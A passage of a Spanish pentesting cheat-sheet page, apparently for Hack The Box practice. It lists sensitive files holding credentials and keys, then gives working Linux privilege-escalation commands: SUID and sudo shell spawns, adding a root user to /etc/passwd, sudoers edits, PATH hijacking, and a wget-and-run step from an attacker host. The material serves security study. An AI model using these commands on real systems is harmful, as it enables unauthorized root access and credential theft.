---
layout: default
title: Archivos Sensibles
---

<div class="page">
  <div class="section-header">
    <h2>Archivos Sensibles & PrivEsc</h2>
    <p>Qué buscar tras obtener acceso a un sistema — credenciales, claves SSH, vectores de escalada de privilegios.</p>
  </div>
</div>

<style>
  .sf-outer { max-width: 780px; margin: 0 auto; padding: 0 2rem 4rem; }
  .sf-tabs { display: flex; gap: 6px; margin-bottom: 1.5rem; flex-wrap: wrap; }
  .sf-tab { font-size: 12px; padding: 6px 14px; border-radius: 20px; border: 1px solid var(--border-strong); background: transparent; color: var(--text-muted); cursor: pointer; transition: all 0.15s; font-family: var(--mono); }
  .sf-tab:hover { background: var(--surface2); color: var(--text); }
  .sf-tab.active { background: #0c1f35; color: #60a5fa; border-color: #378ADD; }
  .sf-panel { display: none; }
  .sf-panel.active { display: block; }

  .sf-search { width: 100%; margin-bottom: 1.25rem; box-sizing: border-box; background: var(--surface2); border: 1px solid var(--border-strong); border-radius: 6px; padding: 0.4rem 0.85rem; font-size: 13px; color: var(--text); font-family: var(--sans); outline: none; }
  .sf-search::placeholder { color: var(--text-dim); }
  .sf-search:focus { border-color: rgba(255,255,255,0.25); }

  .sf-table-wrap { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
  .sf-table { width: 100%; border-collapse: collapse; }
  .sf-table thead th { font-size: 10px; font-weight: 500; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.07em; padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--border); background: var(--surface2); font-family: var(--mono); }
  .sf-table tbody tr { border-bottom: 1px solid var(--border); transition: background 0.1s; }
  .sf-table tbody tr:last-child { border-bottom: none; }
  .sf-table tbody tr:hover { background: var(--surface2); }
  .sf-table td { padding: 10px 12px; vertical-align: top; font-size: 13px; }
  .sf-section-hdr { font-size: 11px; font-weight: 500; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.08em; padding: 7px 12px; background: var(--bg); border-bottom: 1px solid var(--border); font-family: var(--mono); }
  .sf-path { font-family: var(--mono); font-size: 12px; color: #60a5fa; display: block; margin-bottom: 2px; word-break: break-all; }
  .sf-os { font-size: 10px; font-family: var(--mono); padding: 1px 6px; border-radius: 4px; display: inline-block; margin-top: 3px; }
  .sf-os.linux { background: #0d2b14; color: #4ade80; }
  .sf-os.windows { background: #0c1f35; color: #60a5fa; }
  .sf-os.both { background: var(--surface2); color: var(--text-muted); }
  .sf-desc { font-size: 12px; color: var(--text-muted); }
  .sf-htb { display: flex; flex-wrap: wrap; gap: 4px; }
  .sf-htb-badge { font-size: 11px; font-family: var(--mono); padding: 2px 8px; border-radius: 4px; background: #2b0d0d; color: #f87171; white-space: nowrap; }
  .sf-example { font-size: 11px; color: var(--text-dim); margin-top: 4px; font-family: var(--mono); font-style: italic; }
  .sf-hidden { display: none !important; }
  .sf-cmd { font-family: var(--mono); font-size: 12px; color: #c084fc; background: var(--surface); padding: 3px 8px; border-radius: 4px; border: 1px solid var(--border); display: block; margin: 4px 0; }

  /* PRIVESC */
  .pv-subtabs { display: flex; gap: 8px; margin-bottom: 1.25rem; }
  .pv-subtab { font-size: 12px; padding: 5px 14px; border-radius: 6px; border: 1px solid var(--border-strong); background: transparent; color: var(--text-muted); cursor: pointer; transition: all 0.15s; font-family: var(--mono); }
  .pv-subtab:hover { background: var(--surface2); color: var(--text); }
  .pv-subtab.active { background: #0c1f35; color: #60a5fa; border-color: #378ADD; }
  .pv-subpanel { display: none; }
  .pv-subpanel.active { display: block; }
  .pv-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .pv-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
  .pv-card-header { display: flex; align-items: center; gap: 10px; padding: 0.8rem 1rem; cursor: pointer; transition: background 0.12s; user-select: none; border-bottom: 1px solid var(--border); }
  .pv-card-header:hover { background: var(--surface2); }
  .pv-badge { font-size: 11px; font-weight: 500; padding: 3px 9px; border-radius: 4px; flex-shrink: 0; font-family: var(--mono); }
  .pv-badge.linux { background: #0d2b14; color: #4ade80; }
  .pv-badge.windows { background: #0c1f35; color: #60a5fa; }
  .pv-header-text { flex: 1; }
  .pv-header-text h3 { font-size: 13px; font-weight: 500; color: var(--text); margin: 0 0 2px; }
  .pv-header-text p { font-size: 11px; color: var(--text-muted); margin: 0; }
  .pv-chevron { color: var(--text-dim); transition: transform 0.2s; }
  .pv-card.open .pv-chevron { transform: rotate(180deg); }
  .pv-body { display: none; padding: 0.85rem 1rem; }
  .pv-card.open .pv-body { display: block; }
  .pv-section { margin-bottom: 10px; }
  .pv-section h4 { font-size: 10px; font-weight: 500; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.07em; margin: 0 0 6px; font-family: var(--mono); }
  .pv-cmd { font-family: var(--mono); font-size: 11px; color: #c084fc; background: var(--surface2); padding: 2px 7px; border-radius: 4px; border: 1px solid var(--border); display: block; margin: 3px 0; }
  .pv-vuln { font-size: 11px; padding: 1px 7px; border-radius: 4px; background: #2b0d0d; color: #f87171; display: inline-block; margin: 2px 2px 2px 0; }
  .pv-tip { background: #0c1f35; border-left: 3px solid #378ADD; border-radius: 0 4px 4px 0; padding: 7px 10px; font-size: 12px; color: #60a5fa; margin-top: 8px; }
  .pv-tip strong { font-size: 10px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.07em; display: block; margin-bottom: 3px; font-family: var(--mono); }
  .pv-htb { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }
  .pv-htb-badge { font-size: 11px; font-family: var(--mono); padding: 2px 7px; border-radius: 4px; background: #2b0d0d; color: #f87171; }
  .pv-full { grid-column: 1 / -1; }

  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
  .cmd-card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1rem 1.1rem; }
  .cmd-card h3 { font-size: 13px; font-weight: 500; color: var(--text); margin: 0 0 12px; font-family: var(--mono); }
  .cmd-card-full { grid-column: 1 / -1; }
  .cmd-inner { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
  .cmd-group p { font-size: 11px; color: var(--text-muted); margin: 0 0 6px; font-family: var(--mono); text-transform: uppercase; letter-spacing: 0.06em; }
</style>

<div class="sf-outer">
  <div class="sf-tabs">
    <button class="sf-tab active" onclick="sfTab(event,'linux')">Linux</button>
    <button class="sf-tab" onclick="sfTab(event,'windows')">Windows</button>
    <button class="sf-tab" onclick="sfTab(event,'web')">Web / PHP</button>
    <button class="sf-tab" onclick="sfTab(event,'db')">Bases de datos</button>
    <button class="sf-tab" onclick="sfTab(event,'cms')">CMS</button>
    <button class="sf-tab" onclick="sfTab(event,'privesc')">PrivEsc</button>
    <button class="sf-tab" onclick="sfTab(event,'comandos')">Comandos</button>
  </div>

  <!-- LINUX -->
  <div class="sf-panel active" id="sf-linux">
    <input class="sf-search" type="text" placeholder="Filtrar archivos Linux..." oninput="sfFilter('linux',this.value)">
    <div class="sf-table-wrap">
      <table class="sf-table" id="tbl-linux">
        <thead><tr><th style="width:30%">Archivo / Ruta</th><th style="width:35%">Qué contiene</th><th style="width:35%">Ejemplos HTB</th></tr></thead>
        <tbody>
          <tr><td colspan="3" class="sf-section-hdr">Credenciales del sistema</td></tr>
          <tr><td><span class="sf-path">/etc/passwd</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Lista de usuarios del sistema. Sin contraseñas pero útil para enumerar usuarios válidos.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Lame</span><span class="sf-htb-badge">Beep</span></div><span class="sf-example">→ Usuarios válidos para brute force</span></td></tr>
          <tr><td><span class="sf-path">/etc/shadow</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Hashes de contraseñas. Requiere root. Crackear con hashcat -m 1800 o john.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Networked</span></div><span class="sf-example">→ root:$6$...: crack con hashcat</span></td></tr>
          <tr><td><span class="sf-path">/etc/sudoers</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Permisos sudo. Busca NOPASSWD o comandos específicos abusables via GTFOBins.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Shocker</span><span class="sf-htb-badge">Bashed</span></div><span class="sf-example">→ www-data puede sudo sin pass</span></td></tr>
          <tr><td><span class="sf-path">/etc/crontab</span><span class="sf-os linux">Linux</span><br><span class="sf-path">/etc/cron.d/*</span></td><td><span class="sf-desc">Tareas programadas. Busca scripts ejecutados como root que puedas modificar.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Cronos</span><span class="sf-htb-badge">Traceback</span></div><span class="sf-example">→ script.sh ejecutado por root cada minuto</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">Historial y entorno</td></tr>
          <tr><td><span class="sf-path">~/.bash_history</span><span class="sf-os linux">Linux</span><br><span class="sf-path">~/.zsh_history</span></td><td><span class="sf-desc">Historial de comandos. Puede contener contraseñas escritas en comandos o rutas sensibles.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Archetype</span><span class="sf-htb-badge">Valentine</span></div><span class="sf-example">→ mysql -u root -pPassword123</span></td></tr>
          <tr><td><span class="sf-path">/proc/self/environ</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Variables de entorno del proceso actual. Puede exponer API keys, contraseñas, tokens.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">TwoMillion</span></div><span class="sf-example">→ APP_KEY, DB_PASSWORD en variables</span></td></tr>
          <tr><td><span class="sf-path">.env</span><span class="sf-os linux">Linux</span><br><span class="sf-path">/var/www/html/.env</span></td><td><span class="sf-desc">Variables de entorno de aplicaciones. DB_PASSWORD, API_KEY, APP_KEY, SECRET_KEY.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">TwoMillion</span></div><span class="sf-example">→ DB_PASSWORD=SuperDuperPass123</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">Claves SSH</td></tr>
          <tr><td><span class="sf-path">~/.ssh/id_rsa</span><span class="sf-os linux">Linux</span><br><span class="sf-path">~/.ssh/id_ed25519</span></td><td><span class="sf-desc">Clave privada SSH. chmod 600 id_rsa antes de usarla: ssh -i id_rsa user@ip</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Markup</span><span class="sf-htb-badge">OpenAdmin</span></div><span class="sf-example">→ ssh -i id_rsa daniel@ip</span></td></tr>
          <tr><td><span class="sf-path">~/.ssh/authorized_keys</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Claves públicas autorizadas. Si puedes escribir aquí, añade tu clave para acceso SSH.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Redis labs</span></div><span class="sf-example">→ Planta tu clave via Redis/NFS</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">Configuración del sistema</td></tr>
          <tr><td><span class="sf-path">/etc/hosts</span><span class="sf-os both">Linux/Win</span></td><td><span class="sf-desc">Resolución local de nombres. Revela subdominios y hosts internos de la red.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Forest</span><span class="sf-htb-badge">Active</span></div><span class="sf-example">→ 10.10.10.x dc.htb.local</span></td></tr>
          <tr><td><span class="sf-path">/etc/fstab</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Montajes del sistema. Puede revelar shares NFS, SMB montados o discos cifrados.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">NFS labs</span></div><span class="sf-example">→ shares NFS montados automáticamente</span></td></tr>
          <tr><td><span class="sf-path">/var/mail/*</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Correos del sistema. Puede contener credenciales enviadas por scripts o notificaciones.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Postfix labs</span></div><span class="sf-example">→ Credenciales enviadas por cron</span></td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- WINDOWS -->
  <div class="sf-panel" id="sf-windows">
    <input class="sf-search" type="text" placeholder="Filtrar archivos Windows..." oninput="sfFilter('windows',this.value)">
    <div class="sf-table-wrap">
      <table class="sf-table" id="tbl-windows">
        <thead><tr><th style="width:30%">Archivo / Ruta</th><th style="width:35%">Qué contiene</th><th style="width:35%">Ejemplos HTB</th></tr></thead>
        <tbody>
          <tr><td colspan="3" class="sf-section-hdr">Historial y credenciales</td></tr>
          <tr><td><span class="sf-path">C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><span class="sf-os windows">Windows</span></td><td><span class="sf-desc">Historial de comandos PowerShell. Equivalente a .bash_history. Muy frecuente con credenciales hardcodeadas.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Archetype</span></div><span class="sf-example">→ net use * /u:admin Password123</span></td></tr>
          <tr><td><span class="sf-path">C:\Windows\System32\config\SAM</span><span class="sf-os windows">Windows</span><br><span class="sf-path">C:\Windows\System32\config\SYSTEM</span></td><td><span class="sf-desc">Hashes de usuarios locales. Necesitas SYSTEM para leer. Extrae con secretsdump.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Blue</span><span class="sf-htb-badge">Resolute</span></div><span class="sf-example">→ impacket-secretsdump -sam SAM -system SYSTEM local</span></td></tr>
          <tr><td><span class="sf-path">C:\Windows\NTDS\ntds.dit</span><span class="sf-os windows">Windows</span></td><td><span class="sf-desc">Base de datos AD con todos los hashes del dominio. Solo en Domain Controllers. El santo grial del AD.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Active</span><span class="sf-htb-badge">Forest</span></div><span class="sf-example">→ secretsdump -ntds ntds.dit -system SYSTEM local</span></td></tr>
          <tr><td><span class="sf-path">C:\Windows\Panther\Unattend.xml</span><span class="sf-os windows">Windows</span></td><td><span class="sf-desc">Archivo de instalación desatendida. Contraseña del Administrator en base64 o texto plano.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Optimum</span></div><span class="sf-example">→ &lt;Password&gt;QWRtaW5AMTIz&lt;/Password&gt;</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">Credenciales almacenadas</td></tr>
          <tr><td><span class="sf-path">C:\Users\[user]\Desktop\</span><span class="sf-os windows">Windows</span><br><span class="sf-path">C:\Users\[user]\Documents\</span></td><td><span class="sf-desc">Busca .txt, .kdbx (KeePass), .ps1, .bat con credenciales o notas de contraseñas.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Jeeves</span></div><span class="sf-example">→ CEH.kdbx — base de datos KeePass</span></td></tr>
          <tr><td><span class="sf-path">C:\inetpub\wwwroot\web.config</span><span class="sf-os windows">Windows</span></td><td><span class="sf-desc">Configuración de IIS. Connection strings con credenciales de MSSQL, claves de cifrado.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Bounty</span><span class="sf-htb-badge">Hackback</span></div><span class="sf-example">→ connectionString con usuario y pass de MSSQL</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">Registro de Windows</td></tr>
          <tr><td><span class="sf-path">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><span class="sf-os windows">Windows</span></td><td><span class="sf-desc">AutoLogon configurado. Puede contener DefaultPassword en texto plano.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Conceal</span></div><span class="sf-example">→ reg query "HKLM\...\Winlogon"</span></td></tr>
          <tr><td><span class="sf-path">HKCU\Software\SimonTatham\PuTTY\Sessions\</span><span class="sf-os windows">Windows</span></td><td><span class="sf-desc">Sesiones guardadas de PuTTY. Puede contener claves SSH y hosts guardados.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Bastard</span></div><span class="sf-example">→ Claves SSH guardadas en sesiones PuTTY</span></td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- WEB / PHP -->
  <div class="sf-panel" id="sf-web">
    <input class="sf-search" type="text" placeholder="Filtrar archivos web..." oninput="sfFilter('web',this.value)">
    <div class="sf-table-wrap">
      <table class="sf-table" id="tbl-web">
        <thead><tr><th style="width:30%">Archivo / Ruta</th><th style="width:35%">Qué contiene</th><th style="width:35%">Ejemplos HTB</th></tr></thead>
        <tbody>
          <tr><td colspan="3" class="sf-section-hdr">PHP y aplicaciones web</td></tr>
          <tr><td><span class="sf-path">.env</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Variables de entorno. DB_PASSWORD, APP_KEY, API_KEY, SECRET_KEY, DATABASE_URL.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">TwoMillion</span></div><span class="sf-example">→ DB_PASSWORD=SuperDuperPass123</span></td></tr>
          <tr><td><span class="sf-path">config.php</span><span class="sf-os both">Linux/Win</span><br><span class="sf-path">configuration.php</span></td><td><span class="sf-desc">Configuración PHP con credenciales de base de datos hardcodeadas y claves secretas.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Base</span></div><span class="sf-example">→ $db_pass = "thisisagoodpass";</span></td></tr>
          <tr><td><span class="sf-path">.htpasswd</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Usuarios y contraseñas hasheadas de auth HTTP básica de Apache. Crackear con john o hashcat.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Included</span></div><span class="sf-example">→ mike:$apr1$... → Sheffield19</span></td></tr>
          <tr><td><span class="sf-path">settings.py</span><span class="sf-os both">Linux/Win</span></td><td><span class="sf-desc">Configuración Django. SECRET_KEY, DATABASES con usuario y contraseña, DEBUG mode.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Encoding</span></div><span class="sf-example">→ SECRET_KEY = "django-insecure-..."</span></td></tr>
          <tr><td><span class="sf-path">application.properties</span><span class="sf-os both">Linux/Win</span></td><td><span class="sf-desc">Configuración Spring Boot. datasource.password, spring.security.*, credenciales de servicios.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Stratosphere</span></div><span class="sf-example">→ spring.datasource.password=MasterCarbonFull</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">Servidores web</td></tr>
          <tr><td><span class="sf-path">/etc/apache2/sites-enabled/*.conf</span><span class="sf-os linux">Linux</span><br><span class="sf-path">/etc/nginx/sites-enabled/*</span></td><td><span class="sf-desc">Virtual hosts. Revela subdominios internos, rutas de aplicaciones y proxies.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Horizontall</span></div><span class="sf-example">→ Subdominio interno api.horizontall.htb</span></td></tr>
          <tr><td><span class="sf-path">/var/log/apache2/access.log</span><span class="sf-os linux">Linux</span><br><span class="sf-path">/var/log/nginx/access.log</span></td><td><span class="sf-desc">Logs de acceso. Útiles para log poisoning + LFI. Revelan rutas y parámetros.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Nineveh</span><span class="sf-htb-badge">Poison</span></div><span class="sf-example">→ Log poisoning con User-Agent PHP</span></td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- BASES DE DATOS -->
  <div class="sf-panel" id="sf-db">
    <input class="sf-search" type="text" placeholder="Filtrar archivos de bases de datos..." oninput="sfFilter('db',this.value)">
    <div class="sf-table-wrap">
      <table class="sf-table" id="tbl-db">
        <thead><tr><th style="width:30%">Archivo / Ruta</th><th style="width:35%">Qué contiene</th><th style="width:35%">Ejemplos HTB</th></tr></thead>
        <tbody>
          <tr><td colspan="3" class="sf-section-hdr">MySQL / MariaDB</td></tr>
          <tr><td><span class="sf-path">/etc/mysql/debian.cnf</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Credenciales del usuario debian-sys-maint. A menudo legible y permite acceso total.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">MySQL labs</span></div><span class="sf-example">→ mysql -u debian-sys-maint -pPASSWORD</span></td></tr>
          <tr><td><span class="sf-path">~/.my.cnf</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Configuración personal de MySQL con [client] password= para conexión automática.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Admirer</span></div><span class="sf-example">→ [client] password=adminMysql23</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">SQLite y otros</td></tr>
          <tr><td><span class="sf-path">/var/lib/grafana/grafana.db</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">SQLite de Grafana. Usuarios, contraseñas hasheadas y credenciales de datasources.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Explore</span></div><span class="sf-example">→ sqlite3 grafana.db "select login,password from user"</span></td></tr>
          <tr><td><span class="sf-path">*.db / *.sqlite / *.sqlite3</span><span class="sf-os both">Linux/Win</span></td><td><span class="sf-desc">Bases de datos SQLite de aplicaciones. Busca en /var/lib/, /opt/, home del usuario.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Passage</span></div><span class="sf-example">→ /var/www/html/CuteNews/users.db</span></td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- CMS -->
  <div class="sf-panel" id="sf-cms">
    <input class="sf-search" type="text" placeholder="Filtrar archivos CMS..." oninput="sfFilter('cms',this.value)">
    <div class="sf-table-wrap">
      <table class="sf-table" id="tbl-cms">
        <thead><tr><th style="width:30%">Archivo / Ruta</th><th style="width:35%">Qué contiene</th><th style="width:35%">Ejemplos HTB</th></tr></thead>
        <tbody>
          <tr><td colspan="3" class="sf-section-hdr">WordPress</td></tr>
          <tr><td><span class="sf-path">/var/www/html/wp-config.php</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Configuración principal. DB_NAME, DB_USER, DB_PASSWORD, DB_HOST y secret keys.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Blog</span><span class="sf-htb-badge">Pressed</span></div><span class="sf-example">→ define('DB_PASSWORD', 'k+AfpM...')</span></td></tr>
          <tr><td colspan="3" class="sf-section-hdr">Drupal / Joomla / Magento</td></tr>
          <tr><td><span class="sf-path">/sites/default/settings.php</span><span class="sf-os linux">Linux</span></td><td><span class="sf-desc">Configuración de Drupal con credenciales de base de datos.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Drupal labs</span></div><span class="sf-example">→ 'password' => 'drupal_password'</span></td></tr>
          <tr><td><span class="sf-path">/configuration.php</span><span class="sf-os both">Linux/Win</span></td><td><span class="sf-desc">Configuración de Joomla. $password (DB), $secret, $db, $user.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Joomla labs</span></div><span class="sf-example">→ public $password = 'nv5uz9r3ZEDzVjNu';</span></td></tr>
          <tr><td><span class="sf-path">/app/etc/local.xml</span><span class="sf-os both">Linux/Win</span></td><td><span class="sf-desc">Configuración de Magento con credenciales de BD en texto plano en XML.</span></td><td><div class="sf-htb"><span class="sf-htb-badge">Magento labs</span></div><span class="sf-example">→ &lt;password&gt;r@inbo#bow&lt;/password&gt;</span></td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- PRIVESC -->
  <div class="sf-panel" id="sf-privesc">
    <div class="pv-subtabs">
      <button class="pv-subtab active" onclick="pvTab(event,'linux')">Linux PrivEsc</button>
      <button class="pv-subtab" onclick="pvTab(event,'windows')">Windows PrivEsc</button>
    </div>

    <div class="pv-subpanel active" id="pv-linux">
      <div class="pv-grid">

        <div class="pv-card" id="pv-suid">
          <div class="pv-card-header" onclick="pvToggle('pv-suid')"><span class="pv-badge linux">SUID</span><div class="pv-header-text"><h3>Binarios SUID</h3><p>Se ejecutan con permisos del propietario (root)</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">find / -perm -4000 -type f 2>/dev/null</span><span class="pv-cmd">find / -perm -u=s -type f 2>/dev/null</span></div>
            <div class="pv-section"><h4>Binarios abusables (GTFOBins)</h4><span class="pv-vuln">bash</span><span class="pv-vuln">find</span><span class="pv-vuln">vim</span><span class="pv-vuln">python</span><span class="pv-vuln">perl</span><span class="pv-vuln">nmap</span><span class="pv-vuln">cp</span><span class="pv-vuln">awk</span><span class="pv-vuln">wget</span><span class="pv-vuln">curl</span><span class="pv-vuln">env</span><span class="pv-vuln">tee</span></div>
            <div class="pv-section"><h4>Explotación</h4><span class="pv-cmd">bash -p</span><span class="pv-cmd">find . -exec /bin/sh -p \; -quit</span><span class="pv-cmd">python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'</span><span class="pv-cmd">vim -c ':!/bin/bash -p'</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Shocker</span><span class="pv-htb-badge">Beep</span><span class="pv-htb-badge">Nibbles</span></div>
            <div class="pv-tip"><strong>Tip</strong>Consulta gtfobins.github.io para cada binario SUID que encuentres. Hay cientos de bypasses documentados.</div>
          </div>
        </div>

        <div class="pv-card" id="pv-sudo">
          <div class="pv-card-header" onclick="pvToggle('pv-sudo')"><span class="pv-badge linux">Sudo</span><div class="pv-header-text"><h3>Abuso de sudo</h3><p>Comandos permitidos sin contraseña</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">sudo -l</span></div>
            <div class="pv-section"><h4>Patrones peligrosos</h4><span class="pv-cmd">(ALL) NOPASSWD: /usr/bin/vim → vim -c ':!/bin/bash'</span><span class="pv-cmd">(ALL) NOPASSWD: ALL → sudo su</span><span class="pv-cmd">(root) NOPASSWD: /bin/cp → sobreescribir /etc/passwd</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Bashed</span><span class="pv-htb-badge">Networked</span><span class="pv-htb-badge">Validation</span></div>
            <div class="pv-tip"><strong>Tip</strong>sudo -l es el primer comando tras obtener shell. Si ves NOPASSWD, busca el binario en GTFOBins inmediatamente.</div>
          </div>
        </div>

        <div class="pv-card" id="pv-cron">
          <div class="pv-card-header" onclick="pvToggle('pv-cron')"><span class="pv-badge linux">Cron</span><div class="pv-header-text"><h3>Tareas programadas</h3><p>Scripts que root ejecuta periódicamente</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">cat /etc/crontab</span><span class="pv-cmd">ls -la /etc/cron*</span><span class="pv-cmd">crontab -l</span></div>
            <div class="pv-section"><h4>Vectores de ataque</h4><span class="pv-cmd">Script writable → inyectar reverse shell</span><span class="pv-cmd">Wildcard en tar → --checkpoint-action=exec=sh shell.sh</span><span class="pv-cmd">PATH hijacking → binario malicioso con el mismo nombre</span></div>
            <div class="pv-section"><h4>Monitorear en tiempo real</h4><span class="pv-cmd">pspy64 (detecta procesos sin root)</span><span class="pv-cmd">watch -n 1 "ps aux | grep -v grep"</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Cronos</span><span class="pv-htb-badge">Traceback</span><span class="pv-htb-badge">Postman</span></div>
            <div class="pv-tip"><strong>Tip</strong>pspy es la herramienta más útil para detectar crons ocultos. Transfiérela al objetivo: wget http://tuip/pspy64; chmod +x pspy64; ./pspy64</div>
          </div>
        </div>

        <div class="pv-card" id="pv-cap">
          <div class="pv-card-header" onclick="pvToggle('pv-cap')"><span class="pv-badge linux">Capabilities</span><div class="pv-header-text"><h3>Linux Capabilities</h3><p>Permisos granulares similares a SUID</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">getcap -r / 2>/dev/null</span></div>
            <div class="pv-section"><h4>Capabilities peligrosas</h4><span class="pv-cmd">cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span><span class="pv-cmd">cap_net_raw → tcpdump para capturar tráfico</span><span class="pv-cmd">cap_dac_override → leer/escribir cualquier archivo</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Cap</span></div>
            <div class="pv-tip"><strong>Tip</strong>cap_setuid en python o perl es equivalente a SUID. Permite cambiar el UID a 0 (root) y ejecutar comandos privilegiados.</div>
          </div>
        </div>

        <div class="pv-card" id="pv-writable">
          <div class="pv-card-header" onclick="pvToggle('pv-writable')"><span class="pv-badge linux">Writable</span><div class="pv-header-text"><h3>Archivos escribibles</h3><p>Archivos que root ejecuta y tú puedes modificar</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Enumerar</h4><span class="pv-cmd">find / -writable -type f 2>/dev/null | grep -v /proc</span><span class="pv-cmd">ls -la /etc/passwd</span></div>
            <div class="pv-section"><h4>Explotación</h4><span class="pv-cmd">/etc/passwd writable → echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd → su r00t</span><span class="pv-cmd">/etc/sudoers writable → echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Nibbles</span><span class="pv-htb-badge">Sunday</span></div>
            <div class="pv-tip"><strong>Tip</strong>Si /etc/passwd es escribible genera un hash con openssl passwd -1 "pass" y añade: nuevoroot:HASH:0:0::/root:/bin/bash</div>
          </div>
        </div>

        <div class="pv-card" id="pv-path">
          <div class="pv-card-header" onclick="pvToggle('pv-path')"><span class="pv-badge linux">PATH</span><div class="pv-header-text"><h3>PATH Hijacking</h3><p>Script usa comandos sin ruta absoluta</p></div><span class="pv-chevron">▾</span></div>
          <div class="pv-body">
            <div class="pv-section"><h4>Detectar y explotar</h4><span class="pv-cmd">strings /script (buscar comandos sin /)</span><span class="pv-cmd">export PATH=/tmp:$PATH</span><span class="pv-cmd">echo '/bin/bash -p' > /tmp/ls && chmod +x /tmp/ls</span><span class="pv-cmd">sudo /script (ejecuta nuestro ls malicioso)</span></div>
            <div class="pv-htb"><span class="pv-htb-badge">Networked</span><span class="pv-htb-badge">Buff</span></div>
            <div class="pv-tip"><strong>Tip</strong>Si un script SUID llama a "ls" o "cat" sin ruta absoluta, crea un binario falso con ese nombre en /tmp y manipula el PATH.</div>
          </div>
        </div>

        <div class="pv-card" id="pv-nfs">
